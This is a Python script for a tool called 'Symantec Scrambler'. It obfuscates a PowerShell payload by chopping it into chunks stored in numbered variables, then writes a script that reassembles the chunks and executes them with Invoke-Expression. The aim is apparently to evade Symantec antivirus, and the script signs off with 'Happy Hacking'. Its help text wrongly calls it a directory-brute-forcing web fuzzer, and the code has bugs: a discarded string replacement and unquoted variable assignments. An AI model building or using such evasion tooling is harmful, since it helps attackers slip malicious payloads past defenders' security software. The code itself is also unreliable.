#!/bin/usr/python3

import sys
import argparse
from art import *
from random import randint

def main():
	#Create Parser Obj to get input arguments
	parser = argparse.ArgumentParser(description='Yet Another Web Fuzzing Tool Designed to Brute Force Directories')
	parser.add_argument('-f','--file',  action="store", dest="fileName", help='Takes in the payload you would like scrambled')
	parser.add_argument('-t', '--type', action="store", dest="payloadType", nargs='?', const='psh', type=str, default='psh', help="Takes in the expected payload type")
	parser.add_argument('-o','--output',  action="store", dest="outputFileName", help='File to output results to, else it will put it in a file called SymantecScrambler.ps1')
	parser.add_argument('--version', action='version', version='%(prog)s 1.1')

	#Check and Ensure Proper Arguments were passed.  If not, displays help menu
	if len(sys.argv[1:]) == 0:
		printAsciiTitle()
		parser.print_help()
		parser.exit()
	#Start the Scrambling
	inputs = parser.parse_args()

	if inputs.payloadType == 'psh':
		printAsciiTitle()
		#Read In Payload File
		cleanFile = open(inputs.fileName,"r")
		cleanContent = cleanFile.read()
		#Generate Random number to Make Payload More Random
		breakup = randint(2,4)
		#Break Payload Up into Sections
		print("Broke payload into sections")
		allData = [cleanContent[i:i+breakup] for i in range(0,len(cleanContent),breakup)]
		#Gather All Unique Strings (This Is Used To Reduce Size of Payload
		chunks = uniqueChars(allData)
		#print(chunks)
		if inputs.outputFileName:
			scrambleFile(inputs.outputFileName,chunks,allData)
		else:
			fileName = "SymantecScrambler.ps1"
			scrambleFile(fileName,chunks,allData)
		print("File Write Complete")
		print("Happy Hacking ;*")
#Print Ascii Art Title
def printAsciiTitle():
	asciiArt = text2art("Symantec Scrambler",font="graffiti")
	print(asciiArt)

#Find Unique Characters in the payload
def uniqueChars(list):
	uniqueVals = []
	for chunk in list:
		if chunk not in uniqueVals:
			uniqueVals.append(chunk)
	return uniqueVals

#Scrambled up the file
def scrambleFile(fileName,chunks,allData):
	scrambledFile = open(fileName,"w+")
	i = 0
	chunksNoChange=chunks
	for chunk in chunks:
		if "\\n" in chunk:
			chunk.replace('\\n','`n')
		scrambledFile.write('$' + str(i) + '=' + chunk + '\n')
		i = i + 1
	print("Wrote payload sections to file")
	for chunk in chunksNoChange:
		for n, y in enumerate(allData):
			if y == chunk:
				allData[n] = '$' + str(chunks.index(chunk))
	scrambledFile.write('$Command=' + ''.join(allData))
	scrambledFile.write('\n')
	scrambledFile.write('iex $Command')

if __name__ == "__main__":
	main()
